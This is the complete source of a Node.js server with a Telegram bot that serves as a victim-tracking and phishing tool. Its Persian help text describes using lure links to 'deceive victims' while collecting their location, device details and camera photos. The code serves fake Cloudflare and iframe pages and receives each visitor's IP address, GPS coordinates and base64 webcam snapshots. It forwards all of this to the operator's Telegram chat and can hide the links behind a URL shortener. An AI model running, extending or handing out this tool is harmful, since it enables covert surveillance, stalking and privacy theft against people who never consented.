const fs = require("fs");
const express = require("express");
var cors = require('cors');
var bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const bot = new TelegramBot(process.env["bot"], {polling: true});
var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(cors());
app.set("view engine", "ejs");

//Modify your URL here
var hostURL="YOUR URL";
//TOGGLE for 1pt Proxy and Shorters
var use1pt=true;



app.get("/w/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
  
if(req.params.path != null){
res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/NiCodeTeam");
}

         
                              
});

app.get("/c/:path/:uri",(req,res)=>{
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}


if(req.params.path != null){
res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
} 
else{
res.redirect("https://t.me/NiCodeTeam");
}

         
                              
});



bot.on('message', async (msg) => {
const chatId = msg.chat.id;

 

if(msg?.reply_to_message?.text=="🌐 وبسایت مدنظر خود را وارد بکنید"){
 createLink(chatId,msg.text); 
}
  
if(msg.text=="/start"){
var m={
reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
};

bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nشما می توانید از این ربات برای ردیابی افراد فقط از طریق یک لینک ساده استفاده کنید.\nمی تواند اطلاعاتی مانند مکان، اطلاعات دستگاه، عکس های دوربین را جمع آوری کند.\n\nبرای اطلاعات بیشتر، /help را تایپ کنید.`,m);
}
else if(msg.text=="/create"){
createNew(chatId);
}
else if(msg.text=="/help"){
bot.sendMessage(chatId,` از طریق این ربات می توانید افراد را فقط با ارسال یک لینک ساده ردیابی کنید.\n\nSend /create
برای شروع، سپس از شما یک URL می خواهد که در iframe برای فریب دادن قربانیان استفاده می شود.\nبعد از دریافت
آدرس اینترنتی 2 پیوند را برای شما ارسال می کند که می توانید از آنها برای ردیابی افراد استفاده کنید.
\n\nمشخصات فنی.
\n1. پیوند Cloudflare: این روش یک صفحه تحت حمله cloudflare را برای جمع آوری اطلاعات نشان می دهد و پس از آن قربانی به URL مقصد هدایت می شود.
\n2. پیوند وب ویو: این یک وب سایت (بینگ سابق، سایت های دوستیابی و غیره) را نشان می دهد که از iframe برای جمع آوری اطلاعات استفاده می کند.
( ⚠️ بسیاری از سایت‌ها ممکن است تحت این روش کار نکنند، اگر هدر x-frame را داشته باشند https://google.com)
\n\n
`);
}
  
  
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
} 
});
bot.on('polling_error', (error) => {
//console.log(error.code); 
});






async function createLink(cid,msg){

var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1 ) && !encoded) {
 
var url=cid.toString(36)+'/'+btoa(msg);
var m={
  reply_markup:JSON.stringify({
    "inline_keyboard":[[{text:"لینک جدید ایجاد کنید",callback_data:"crenew"}]]
  } )
};

var cUrl=`${hostURL}/c/${url}`;
var wUrl=`${hostURL}/w/${url}`;
  
bot.sendChatAction(cid,"typing");
if(use1pt){
var x=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(cUrl)}`).then(res => res.json());
var y=await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(wUrl)}`).then(res => res.json());

var f="",g="";

for(var c in x){
f+=x[c]+"\n";
}

for(var c in y){
g+=y[c]+"\n";
}
  
bot.sendMessage(cid, `پیوندهای جدید با موفقیت ایجاد شد \nURL: ${msg}\n\n✅پیوندهای شما\n\n🌐 پیوند صفحه CloudFlare\n${f}\n\n🌐 لینک صفحه نمایش وب\n${g}`,m);
}
else{

bot.sendMessage(cid, `پیوندهای جدید با موفقیت ایجاد شد.\nURL: ${msg}\n\n✅پیوندهای شما\n\n🌐 پیوند صفحه CloudFlare\n${cUrl}\n\n🌐 لینک صفحه نمایش وب\n${wUrl}`,m);
}
}
else{
bot.sendMessage(cid,`⚠️ لطفا با پروتکل 
http - https 
وارد بکنید`);
createNew(cid);

}  
}


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`🌐 URL خود را وارد کنید`,mk);
}





app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});

  
});


app.post("/location",(req,res)=>{

  
var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
  
res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null; 
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});

  
res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
var uid=decodeURIComponent(req.body.uid)  || null;
var img=decodeURIComponent(req.body.img) || null;
  
if( uid != null && img != null){
  
var buffer=Buffer.from(img,'base64');
  
var info={
filename:"camsnap.png",
contentType: 'image/png'
};


try {
bot.sendPhoto(parseInt(uid,36),buffer,{},info);
} catch (error) {
console.log(error);
}


res.send("Done");
 
}

});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
